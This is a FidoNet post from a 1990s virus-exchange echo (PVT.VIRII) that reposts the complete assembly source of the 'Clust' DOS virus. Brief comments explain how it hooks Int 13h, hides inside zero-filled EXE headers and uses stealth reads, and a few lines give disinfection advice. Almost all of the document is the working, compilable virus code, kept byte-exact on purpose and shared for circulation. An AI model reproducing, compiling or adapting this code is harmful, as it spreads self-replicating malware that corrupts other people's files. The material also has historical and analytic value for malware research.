;ฤ PVT.VIRII (2:465/65.4) ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ PVT.VIRII ฤ
; Msg  : 40 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:15
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : CLUST.ASM
;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ
;.RealName: Max Ivanov
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ญไฎpฌ ๆจ๏ ฎ ขจpใแ ๅ)
;* From : Mike Salvino, 2:283/718 (06 Nov 94 17:48)
;* To   : Daniel Hendry
;* Subj : CLUST.ASM
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Mike.Salvino@f718.n283.z2.fidonet.org
;Clust Virus from TridenT research group - small but fairly interesting,
;it's one of the more advanced from TridenT that I've seen with the
;possible exception of the TPE.

;This virus goes memory resident at the top of lower memory and hooks
;Int 13h.  Whenever an EXE file header is written, it checks to see
;if there is a large field of 0's inside it (VERY common in EXE's)
;and, if so, will put itself inside it and change the exe marker bytes
;'MZ' to a jump to that code.  In this way, it effectively converts the
;file to a COM file when it is run.  After this it re-executes the EXE
;file.  Because of a stealth handler on Int 13h function 2 (absolute
;disk read) the EXE file is read as it originally was (the handler
;zero's out the field in which it resides and restores the jump to
;'MZ').  Because of the way this virus works, it can only infect
;smaller EXE files.

;NOTE:
;Several commands are commented out and have the actual bytes entered
;next to them instead. This is because the compiler that Clust was
;originally compiled on used different translations than mine, and
;I wished to preserve the EXACT virus code.

;Disinfection: Because of this virus' stealth routine, disinfection should
;              be possible simply by Zipping or Arjing all EXE files on an
;              infected disk, then rebooting from a clean disk and unarchiving
;              the files.  The original archiving MUST be done while the
;              virus is active in memory.  Also - after rebooting - make
;              sure the program you use to unarchive the files is _NOT_
;              infected.

;Disassembly by Black Wolf

.model tiny
.code
        org     100h

start:
        jmp     short EntryPoint

LotsaNOPs       db      122 dup (90h)   ;Usually will be EXE header....

OldInt13        dd      0

EntryPoint:
        db      0e9h,7ch,0      ;jmp     InstallVirus

Int13Handler:
        cmp     ah,3
        je      IsDiskWrite

        cmp     ah,2
        jne     GoInt13

        pushf
        call    cs:OldInt13               ;Call Int 13h

        jc      Exit13Handler             ;Exit on error.

        cmp     word ptr es:[bx],7EEBh    ;Is sector infected?
        jne     Exit13Handler

        mov     word ptr es:[bx],5A4Dh    ;Cover mark with 'MZ'

        push    di cx ax                  ;Stealth routine.....
        mov     cx,115h
        xor     ax,ax
        db      89h,0dfh                  ;mov     di,bx

                          ;Zero out virus from
        add     di,80h                    ;sector when it is read.
        rep     stosb
        pop     ax cx di

Exit13Handler:
        iret
GoInt13:
        jmp     cs:[OldInt13]
IsDiskWrite:
        cmp     word ptr es:[bx],5A4Dh  ;Is EXE file being written?
        jne     GoInt13

        cmp     word ptr es:[bx+4],75h  ;Is file too large?
        jae     GoInt13

        push    ax cx si di ds
        push    es
        pop     ds
        db      89h,0deh                 ;mov     si,bx

        add     si,80h                   ;Look in EXE header....
        mov     cx,115h
AllZeros:
        lodsb
        cmp     al,0
        loopz   AllZeros

        cmp     cx,0                    ;Check to see if entire field
        jne     ExitInfectHandler       ;was zeroed - leave if not.


        db      89h,0dfh                  ;mov     di,bx
        add     di,80h
        mov     cx,115h
        mov     si,offset OldInt13
        push    cs
        pop     ds
        rep     movsb

        db      89h,0dfh                ;mov     di,bx

                        ;Copy virus
                        ;over zero area in EXE header.
        mov     ax,7EEBh                ;Stick in Jump over 'MZ'
        stosw

ExitInfectHandler:
        pop     ds di si cx ax          ;Allow Write to process now.
        jmp     short GoInt13

InstallVirus:
        mov     ax,3513h
        int     21h                     ;Get Int 13 addres
        mov     word ptr cs:[OldInt13],bx
        mov     word ptr cs:[OldInt13+2],es

        mov     ah,0Dh
        int     21h                     ;Flush disk buffers

        mov     ah,36h
        mov     dl,0
        int     21h                  ;Get free space on default drive

        mov     ax,cs
        dec     ax
        mov     ds,ax
        cmp     byte ptr ds:0,'Z'       ;Are we the last chain?
        jne     Terminate               ;If not, terminate.

        ;sub     word ptr ds:[3],39h     ;subtract from MCB size
        db      81h,2eh,03,0,39h,0

        ;sub     word ptr ds:[12h],39h   ;subtract from PSP TopOfMem
        db      81h,2eh,12h,0,39h,0

        mov     si,offset OldInt13

        db      89h,0f7h                ;mov     di,si

        mov     es,ds:[12h]             ;ES = new segment
        push    cs
        pop     ds
        mov     cx,115h                 ;Copy virus into memory
        rep     movsb

        mov     ax,2513h
        push    es
        pop     ds
        mov     dx,offset Int13Handler
        int     21h                     ;Set int 13 to virus handler

        mov     ah,4Ah
        push    cs
        pop     es
        mov     bx,39h
        int     21h                     ;Modify mem alloc.

        push    cs
        pop     ds
        mov     bx,ds:[2ch]             ;Get environment segment
        mov     es,bx
        xor     ax,ax
        mov     di,1

ScanForFilename:                                ;Find name of file executed
        dec     di                      ;in environment strings...
        scasw                           ;(located after two 0's)
        jnz     ScanForFilename

        lea     si,[di+2]
        push    bx
        pop     ds                      ;DS = environment segment

        push    cs
        pop     es                      ;ES = code segment

        mov     di,offset Filename
        push    di
        xor     bx,bx

CopyFilename:
        mov     cx,50h
        inc     bx
        lodsb
        cmp     al,0
        jne     StoreFilename           ;Change zero at end of
        mov     al,0Dh                  ;filename to a return

StoreFilename:
        stosb
        cmp     al,0Dh                  ;If it was a return, we're
        loopnz  CopyFilename            ;done copying the filename

        mov     byte ptr ds:[28fh],bl
        push    cs
        pop     ds
        pop     si
        dec     si
        int     2Eh                     ;Re-execute EXE file with
                        ;Stealth handler in memory,
                        ;so Exe is run w/o virus.

Terminate:
        mov     ah,4Ch
        int     21h

        db      0
Filename        db      1

end     start

;-+-  Terminate 1.50/Pro
; + Origin: Fred's Place (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeยeO
;
;/zi,/zd,/zn   Debug info: zi=full, zd=line numbers only, zn=none
;
;--- Aidstest Null: /Kill
; * Origin: ๙PVT.ViRII๚main๚board๚ / Virus Research labs. (2:5030/136)

